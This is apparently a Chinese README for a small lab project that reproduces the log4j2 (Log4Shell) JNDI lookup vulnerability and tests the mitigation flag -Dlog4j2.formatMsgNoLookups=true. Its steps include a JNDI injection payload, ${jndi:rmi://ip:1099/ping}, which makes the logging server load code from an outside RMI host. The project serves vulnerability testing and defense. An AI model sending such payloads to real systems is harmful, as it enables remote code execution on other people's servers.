# log4j2BugTest
## 背景描述
2021年12月9日，log4j2的一个核弹级漏洞响彻技术圈
https://www.oschina.net/news/172999 （ps：文中提及补丁已被相关安全团队验证仍存漏洞）。
本次将使用java模拟log4j2日志打印的lookup调用rmi的漏洞以及验证一种解决此漏洞的方式（特定环境下执行）
## 执行环境
- idea
- jdk1.8.0_20
- 一个漏洞代码类文件，并结合Server类代码放在相应位置（本人放在nginx下并通过factoryLocation配置地址的形式读取）
## 执行流程

1. 启动Server服务
2. 启动SpringBoot应用服务
3. 使用postman发送 ${jndi:rmi://ip:1099/ping} 类似rmi请求
4. 验证通过
5. 给SpringBoot应用添加参数-Dlog4j2.formatMsgNoLookups=true 
6. 重启springBoot应用
7. 进行步骤3 可以看见远程漏洞代码不再执行
